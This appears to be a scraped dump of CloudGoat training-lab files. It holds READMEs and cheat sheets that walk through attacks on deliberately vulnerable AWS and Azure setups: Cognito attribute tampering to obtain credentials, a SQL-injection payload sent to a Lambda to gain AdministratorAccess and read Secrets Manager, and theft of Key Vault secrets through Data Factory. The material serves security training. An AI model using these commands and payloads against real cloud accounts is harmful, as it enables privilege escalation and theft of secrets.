abuse in this scenario.\n2. Network segmentation failures: The real breach involved improper network segmentation between environments, mirrored by the misconfigured VPC peering in this scenario.\n3. Access to sensitive customer data: Both the real breach and this scenario culminate in unauthorized access to customer PII, including names, addresses, phone numbers, and other sensitive information.\n4. Lateral movement techniques: The attackers in both cases used legitimate administration channels to move between systems.\n\n**By understanding how the attack techniques in this scenario map to the real-world breach, security professionals can better understand how to implement proper preventative controls in their own environments.**", "timestamp": "2025-10-24T11:39:56.935144"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/vulnerable_cognito/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vulnerable_cognito/README.md", "content": "\n# Scenario: vulnerable_cognito\n\n**Size:** Small\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create vulnerable_cognito`\n\n## Scenario Resources\n\n- 1 S3 bucket\n- 1 Cognito Userpool\n- 1 Cognito IdentityPool\n- 1 API Gateway REST API\n- 1 Lambda\n- 1 IAM role\n\n## Scenario Start(s)\n\n1. API Gateway URL\n\n## Scenario Goal(s)\n\nGet Cognito IdentityPool credentials.\n\n## Summary\n\nIn this scenario, you are presented with a signup and login page with AWS Cognito in the backend.\nYou need to bypass restrictions and exploit misconfigurations in Amazon Cognito in order to\nelevate your privileges and get Cognito Identity Pool credentials.\n\n## Exploitation Route(s)\n\n![Lucidchart Diagram](exploitation_route.png \"Exploitation Route\")\n\n\n## Walkthrough - Vulnerable Cognito\n\n0. Visit the link generated by the 'cloudgoat create vulnerable_cognito' in a browser. It's called 'apigateway_url'.\n1. Starting with a Login and Signup form, the attacker tries to signup using an email but receives an email validation error.\n2. The attacker opens source code of webpage to get Cognito Userpool client ID.\n3. The attacker then uses AWS CLI to sign up and confirm email manually to bypass client-side validation check for the email.\n4. Attacker logs in and gets redirected to \"reader.html\" webpage which does not contain any useful information. In Burp Suite, attacker finds a custom user attribute added after email confirmation.\n5. The attacker then updates the custom attribute value using AWS CLI to escalate privileges.\n6. Attacker logs in again and finds an Identity Pool session being established in Burp Suite which contains AWS Access keys in response.\n7. Attacker collects the credentials and runs enumerate-iam script to check privileges.\n\nA cheat sheet for this route is available [here](./cheat_sheet.md).\n", "timestamp": "2025-10-24T11:39:57.580091"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/vulnerable_cognito/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vulnerable_cognito/cheat_sheet.md", "content": "`aws cognito-idp sign-up --client-id [ClientID] --username [Username] --password [Password] --user-attributes '[{\"Name\":\"given_name\",\"Value\":\"lorem\"},{\"Name\":\"family_name\",\"Value\":\"ipsum\"}]'`\n\n`aws cognito-idp confirm-sign-up --client-id [ClientID] --username [Username] --confirmation-code [ConfirmationCode]`\n\n`aws cognito-idp get-user --access-token [AccessToken]`\n\n`aws cognito-idp update-user-attributes --access-token [AccessToken] --user-attributes '[{\"Name\":\"custom:access\",\"Value\":\"admin\"}]'`\n\n`aws cognito-identity get-id --region [region] --identity-pool-id '[IdentityPool_Id]' --logins \"cognito-idp.{region}.amazonaws.com/{UserPoolId}={idToken}\"`\n\n`aws cognito-identity get-credentials-for-identity --region [region] --identity-id '[Id-found]' --logins \"cognito-idp.{region}.amazonaws.com/{UserPoolId}={idToken}\"`\n", "timestamp": "2025-10-24T11:39:58.175393"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/vulnerable_lambda/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vulnerable_lambda/README.md", "content": "\n# Scenario: vulnerable_lambda\n\n**Size:** Small\n\n**Difficulty:** Medium\n\n**Command:** `$ ./cloudgoat.py create vulnerable_lambda`\n\n## Scenario Resources\n\n- 1 IAM User\n- 1 IAM Role\n- 1 Lambda\n- 1 Secret\n\n## Scenario Start(s)\n\n1. IAM User 'bilbo'\n\n## Scenario Goal(s)\n\nFind the scenario's secret. (cg-secret-XXXXXX-XXXXXX)\n\n## Summary\n\nIn this scenario, you start as the 'bilbo' user. You will assume a role with more privileges, discover a \nlambda function that applies policies to users, and exploit a vulnerability in the function to escalate \nthe privileges of the bilbo user in order to search for secrets.\n\n## Exploitation Route(s)\n\n![Lucidchart Diagram](exploitation_route.png \"Exploitation Route\")\n\n\n## Walkthrough - IAM User \"bilbo\"\n\n1. Get permissions for the 'bilbo' user.\n2. List all roles.\n3. List lambdas to identify the target lambda.\n4. Look at the lambda source code.\n5. Assume the lambda invoker role.\n6. Craft an injection payload to send through the CLI.\n7. Base64 encode that payload. The single quote injection character is not compatible with the aws cli command otherwise.\n8. Invoke the policy applier lambda function, passing the name of the bilbo user and the injection payload.\n9. Now that Bilbo is an admin, use credentials for that user to list secrets from secretsmanager.\n\nA cheat sheet for this route is available [here](./cheat_sheet.md).\n", "timestamp": "2025-10-24T11:39:58.806456"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/vulnerable_lambda/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vulnerable_lambda/cheat_sheet.md", "content": "## Step 1: Get Permissions for IAM User `bilbo`\nBefore anything else, check what permissions the `bilbo` user currently has.\n\n### Commands\n```bash\n# Get the ARN and full name of the current user\naws --profile bilbo --region us-east-1 sts get-caller-identity\n\n# List policies directly attached to the user (if any)\naws --profile bilbo --region us-east-1 iam list-user-policies --user-name bilbo\n\n# List all permissions assigned via a user policy\naws --profile bilbo --region us-east-1 iam get-user-policy --user-name bilbo --policy-name [your_policy_name]\n```\n### What This Does\n- The first command confirms that you're using the right AWS profile (`bilbo`).\n- The second command checks if there are any user-specific policies.\n- The third command retrieves details about a specific policy.\n\n---\n\n## Step 2: Find and Assume a Privileged Role\nThe next step is to list all roles in the AWS account and look for one that `bilbo` can assume.\n\n### Commands\n```bash\n# List all roles in the AWS account (filtering for CloudGoat roles)\naws --profile bilbo --region us-east-1 iam list-roles | grep cg-\n\n# Get all policies attached to the identified role\naws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]\n\n# Assume the role that allows invoking Lambda functions\naws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name assumed-role\n```\n\n### What This Does\n- Lists all roles, looking for ones associated with CloudGoat (`cg-`).\n- Checks what policies are attached to a promising role.\n- If the role is assumable, we assume it to gain higher privileges.\n\n---\n\n## Step 3: Identify the Target (Vulnerable) Lambda\nOnce you have assumed the Lambda-invoker role, list all available Lambda functions to find the vulnerable one.\n\n### Command\n```bash\n# List all Lambda functions\naws --profile assumed_role --region us-east-1 lambda list-functions\n```\n\n### What This Does\n- Retrieves all Lambda functions in the AWS account.\n- Identifies the one belonging to CloudGoat (it will likely start with `cg-`).\n- This Lambda can apply AWS policies to users‚Äîour attack target.\n\n---\n\n## Step 4: Examine the Lambda Function‚Äôs Code\nThe Lambda function contains source code that determines how it processes requests. We need to look at it for vulnerabilities.\n\n### Command\n```bash\n# Get detailed information about the vulnerable Lambda, including its source code package\naws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]\n```\n\n### What This Does\n- Returns details about the function, including a **download URL** for its deployment package.\n- The package contains the Lambda function‚Äôs code.\n- Look for:\n  - **How it processes input** (is it properly sanitizing input?).\n  - **Any database structure hints** in the comments.\n  - **Potential injection vulnerabilities**.\n\n---\n\n## Step 5: Exploit the Lambda Function\nThe function is vulnerable to an injection attack. We can exploit this by crafting a malicious payload.\n\n### Steps\n1. Create a JSON file (`payload.json`) with a specially crafted policy name:\n   ```json\n   {\n       \"policy_names\": [\"AdministratorAccess' -- \"],\n       \"user_name\": \"[bilbo_user_name_here]\"\n   }\n   ```\n2. Use the AWS CLI to invoke the Lambda function with this payload.\n\n### Commands\n```bash\n# Send the injection payload to the Lambda function\naws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload file://./payload.json out.txt\n\n# Check the output to confirm success\ncat out.txt\n```\n\n### What This Does\n- The JSON payload **injects an extra policy application command** by escaping a string.\n- The Lambda function grants `AdministratorAccess` to `bilbo`, making them an admin.\n\n---\n\n## Step 6: Use Admin Privileges to Retrieve the Secret\nNow that `bilbo` has admin rights, we can access AWS Secrets Manager to retrieve the stored secret.\n\n### Commands\n```bash\n# List all secrets stored in AWS Secrets Manager\naws --profile bilbo --region us-east-1 secretsmanager list-secrets\n\n# Retrieve the value of a specific secret\naws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]\n```\n\n### What This Does\n- The first command lists all available secrets.\n- The second command retrieves the actual secret value.\n\n---\n\n## Scenario Clean up\n- Do not forget to destroy the scenario so you do not get charged by AWS. \n  ```bash\n  ./cloudgoat.py destroy vulnerable_lambda\n  ```\n", "timestamp": "2025-10-24T11:39:58.945843"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/azure/datafactory_secret_theft/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/azure/datafactory_secret_theft/README.md", "content": "# Scenario: datafactory_secret_theft\n**Size:** Small  \n**Dificulty:** Easy  \n**Command:** `cloudgoat create datafactory_secret_theft`  \n\n## Scenario Resources\n- 1 Data Factory (ADF)\n- 1 Key Vault\n\n## Scenario Start(s)\n1. Azure user: `cloudgoat-user[ID]@rhinosecuritylabs.onmicrosoft.com`\n2. Data Factory URL\n\n## Scenario Goal(s)\nObtain the flag from Key Vault.\n\n## Summary\nStarting as the CloudGoat created user, access the Data Factory and figure out how to exfiltrate secrets from the linked service Key Vault.\n\n## Route Walkthrough\n1. Using the provided credentials and Data Factory URL, log into Data Factory.\n2. Identify the linked service Key Vault and its name.\n3. Use a Data Factory Pipeline web request to exfiltrate the secret name and secret value.\n\nA cheat sheet for this route is available [here](./cheat_sheet.md).", "timestamp": "2025-10-24T11:40:00.806667"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/azure/datafactory_secret_theft/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/azure/datafactory_secret_theft/cheat_sheet.md", "content": "\n### Enumerate Linke Services\n1. Open the Data Factory URL and log in as the starting CloudGoat user.\n2. Click \"Manage\" > \"Linked services\". Then click on the linked Key Vault.\n3. Note the linked Key Vault's Base URL.\n\n### Exfiltrate the secret using Data Factory Pipeline's \"Web\" feature\n1. Click \"Author\" > \"Pipelines Actions\" (three dots) > \"New Pipeline\".\n2. Drop down \"General\".\n3. Drag \"Web\" to the Pipeline designer.\n4. Click \"Settings\".\n5. Set the URL to https://{vault-baseurl}/secrets?api-version=7.3\n6. Set Method to \"GET\".\n7. Set \"Authentication\" to \"system-assigned managed identity\". (This will use the privileges assigned to the Data Factory).\n8. Set the \"Resource\" to https://vault.azure.net/.\n9. Click \"Debug\".\n10. Wait for the request to complete and click output to view the response of the request containing the secret name.\n11. Repeat this but use the URL:  https://{vault-baseurl}/{secret_name_from_step_10}?api-version=7.3\n12. This response will give you the flag contained in Key Vault.", "timestamp": "2025-10-24T11:40:00.960445"}
